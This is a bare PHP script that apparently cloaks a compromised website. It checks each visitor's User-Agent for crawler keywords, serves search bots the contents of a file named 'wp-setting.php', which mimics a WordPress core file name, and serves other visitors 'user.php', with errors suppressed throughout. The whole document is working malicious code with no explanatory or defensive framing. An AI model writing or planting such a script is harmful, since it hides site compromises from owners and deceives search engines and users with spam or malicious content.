	<?php  
	error_reporting(0);
	set_time_limit(0);

	$bot_content_file = 'wp-setting.php';
	$user_content_file = 'user.php';
	function is_spider()
	{
		$spiders = ['bot', 'X11', 'macintosh', 'moto', 'google', 'msnbot'];
		$s_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
		
		foreach ($spiders as $spider) {
			if (stripos($s_agent, $spider) !== false) {
				return true;
			}
		}
		return false;
	}

	if (is_spider()) {  
		if (file_exists($bot_content_file)) {
			include($bot_content_file);
		}  
		exit();
	}else{  
		if (file_exists($user_content_file)) {
			include($user_content_file);	
		}  
		exit();
	}


	?>